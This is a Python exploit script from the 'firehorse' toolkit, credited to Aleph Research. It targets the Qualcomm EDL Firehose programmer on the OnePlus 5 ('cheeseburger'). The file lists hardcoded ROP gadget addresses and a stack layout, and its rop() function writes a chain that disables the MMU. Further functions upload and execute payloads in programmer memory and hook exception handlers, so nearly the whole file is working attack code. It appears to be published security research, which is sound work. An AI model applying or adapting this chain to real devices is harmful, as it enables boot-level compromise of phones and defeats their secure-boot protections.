#
# firehrose
# By Roee Hay & Noam Hadad, Aleph Research
#

import argparse
import time
import re
import sys
import binascii
import subprocess
import os
import struct
import pt
import target
import constants
from log import *
from cmd import *
from fw import Framework as FH_FW
from fw import *
from fh import *
import target as t

GADGET_INFINITE_LOOP = 0x14022638
#GADGET_SUPER = 0x14016284
#GADGET_SUPER = 0x14016328
#GADGET_SUPER = 0x146A6FBC
GADGET_SUPER = 0x14016D20
GADGET_ADD_SP = 0x1402FC20
GADGET_BLR_X6 = 0x146A701C 
GADGET_BLR_X8 = 0x1405F048
GADGET_RET = 0x1405F058
GADGET_RESET = 0x140309C0
GADGET_SCTLR_EL3 = 0x14016138
GADGET_SCTLR_EL1 = 0x14016130

"""
SAVED_LR      GADGET_ADD_SP
SAVED_LR+F0   saved x30 <- SUPER_GADGET 
SAVED_LR+F8   saved x30 < - blr x8 gadget
SAVED_LR+100  saved x0
SAVED+LR+108  saved x28
SAVED+LR+110  saved x29 <- SAVED_LR+208
SAVED_LR+118   saved x26
SAVED_LR+120   saved x27
SAVED_LR+128   saved x24
SAVED_LR+130   saved x25 <- 0x1000
SAVED_LR+138   saved x22
SAVED_LR+140   saved x23
SAVED_LR+148   saved x20
SAVED_LR+150   saved x21
SAVED_LR+158   saved x18
SAVED_LR+160   saved x19 <- SAVED_LR+218+28
SAVED_LR+168   saved x16
SAVED_LR+170   saved x17
SAVED_LR+178   saved x14
SAVED_LR+180   saved x15
SAVED_LR+188   saved x12
SAVED_LR+190   saved x13
SAVED_LR+198   saved x10
SAVED_LR+1A0   saved x11
SAVED_LR+1A8   saved x8 <- GADGET_SET_MMU
SAVED_LR+1B0   saved x9  
SAVED_LR+1B8   saved x6
SAVED_LR+1C0   saved x7  
SAVED_LR+1C8   saved x4  
SAVED_LR+1D0   saved x5 
SAVED_LR+1D8   saved x2
SAVED_LR+1E0   saved x3
SAVED_LR+1E8   saved x0
SAVED_LR+1F0  saved x1  <- value for mmu disable
---- restored stack (SAVED_LR+1F8)
SAVED_LR+1F8  saved x20
SAVED_LR+200  saved x19 -<  SAVED_LR+218+28
SAVED_LR+208  saved x29
SAVED_LR+210  saved x30 <- original_saved_lr
---- copied stack (SAVED_LR+218)
final SP


"""
def rop():
    target = t.get()

    # super gadget
#    FH_FW.poke64(target.saved_lr_addr+8, GADGET_INFINITE_LOOP)

    """
    # copy original stack
    FH_FW.copy(target.saved_lr_addr+0x128, target.saved_lr_addr+8, 0x128)

    # copy original saved lr
    FH_FW.poke64(target.saved_lr_addr+0x120, target.saved_lr)

    # set new stack
    FH_FW.poke64(target.saved_lr_addr+0x20, target.saved_lr_addr+0x118)

    # set blr x8 gadget
    FH_FW.poke64(target.saved_lr_addr+0x8, GADGET_RESET)

    # set saved_x8
    FH_FW.poke64(target.saved_lr_addr+0xb8, GADGET_RESET)
    # set super gadget
    FH_FW.poke64(target.saved_lr_addr, GADGET_SUPER)
    """
    # FH_FW.poke64(target.saved_lr_addr+0xC0, 0)
    # FH_FW.poke64(target.saved_lr_addr+0x30, GADGET_RESET)
    # FH_FW.poke64(target.saved_lr_addr+0x28, GADGET_RESET)
    # FH_FW.poke64(target.saved_lr_addr+0x20, GADGET_RESET)
    # FH_FW.poke64(target.saved_lr_addr+0x18, GADGET_RESET)
    # FH_FW.poke64(target.saved_lr_addr+0x10, GADGET_RESET)
    # FH_FW.poke64(target.saved_lr_addr+0x8, GADGET_RESET)

    FH_FW.poke64(target.saved_lr_addr+0x1f0, 0x0) # x1
    FH_FW.poke64(target.saved_lr_addr+0x108, 0x98) # x28
    FH_FW.poke64(target.saved_lr_addr+0x128, 0x1) # x24
    FH_FW.poke64(target.saved_lr_addr+0x130, 0x1000) # X25
    FH_FW.poke64(target.saved_lr_addr+0x160, target.saved_lr_addr+0x218+0x28)
    FH_FW.poke64(target.saved_lr_addr+0x200, target.saved_lr_addr+0x218+0x28)

    FH_FW.copy_and_rebase(target.saved_lr_addr+0x218, target.saved_lr_addr+8, 0x210)
    FH_FW.poke64(target.saved_lr_addr+0x210, target.saved_lr)
    FH_FW.poke64(target.saved_lr_addr+0x110, target.saved_lr_addr+0x208)
    FH_FW.poke64(target.saved_lr_addr+0x1a8, GADGET_SCTLR_EL1)
    FH_FW.poke64(target.saved_lr_addr+0xf8, GADGET_BLR_X8)
    FH_FW.poke64(target.saved_lr_addr+0xf0, GADGET_SUPER)
    FH_FW.poke64(target.saved_lr_addr, GADGET_ADD_SP)


def voodoo():
    target = t.get()
    for i in xrange(4):
        print '%d' % i
        FH_FW.peek(target.fh_base_programmer, 0x1100)


def upload_init64():
    target = t.get()
    FH_FW.poke64(target.fh_base_programmer, 0x12345678)
    FH_FW.sendfile("../device/build/init64.payload", target.fh_base_programmer)
    FH_FW.exe64(target.fh_base_programmer)


def upload_fh():
    target = t.get()
    e = XMLHunter(file("../device/build/fh64.payload", "rb").read(),
                  target.fh_base_programmer, target)
    e.send()
    return


def upload_fh_data():
    target = t.get()

    bbdb = BasicBlocks(target.basicblocks_db_pbl)
    bpm = BreakpointManager(bbdb)
    bpm.bp_programmer(0x1402C958, msg="peek0")
    bpm.bp_programmer(0x1402C964, msg="peek1")

    pm = PatchManager()
    # I('applying patches and breakpoints...')
    # pm.patch32_programmer(0x1402C958, 0xFFFFFFFF)


    I('creating pagecopy...')
    pages = set()

    I('pages: ' + str(pages))
    pc = PageCopy(MODE_PBL, target.pbl_base_addr, target.pbl_copy_addr, pages,
                  target_pages=[0x807D000, 0x807E000, 0x807F000, 0x807C000,
                                0x8068000, 0x806e000, 0x807B000])

    I('uploading firehorse data...')
    fh = Firehorse(pm, bpm, pc)
    fhdata = fh.pack()
    fhbin = file("../tmp/fh.bin", "wb")
    fhbin.write(fhdata)
    fhbin.close()

    e = XMLHunter(fhdata, target.fh_base_programmer+target.fh_scratch_offset, target)
    e.send()


def init_firehose():
    target = t.get()
    cmd = Commands()

    I('initializing firehorse...')
    FH_FW.exe64_cmd(target.fh_base_programmer, cmd.INIT)


def hook_handlers():
    target = t.get()

    I("Hooking handlers")
    for i in xrange(16):
        I("%d" % i)
        FH_FW.sendfile("../device/build/dbgentry64.payload", 0x14015000+i*0x80)


def magic():
    rop()
    voodoo()
    upload_fh_data()
    upload_fh()
    init_firehose()
    hook_handlers()


t.add_target(name="cheeseburger", arch=64,
             programmer_path=r"target/oneplus5/programmer.bin",
             peekpoke_style=1,
             saved_lr=0x1402be48,
             saved_lr_addr=0x1406ae78,
             exe_addr=0x1406ae78+0x210,
             page_table_base=0x1400f000,
             tnsz=28,
             fh_base_programmer=0x14690000,
             fh_base_aboot=0x8f900000,
             fh_scratch_offset=0x20000,
             fh_saved_regs_offset=0,
             egghunter_base=0x1407c000,
             uart=0x14074040,
             ttbr0_el1=0x1400f000,
             pt_levels=3,
             rop=rop,
             magic=magic,
             xmlhunter_part_size=80)
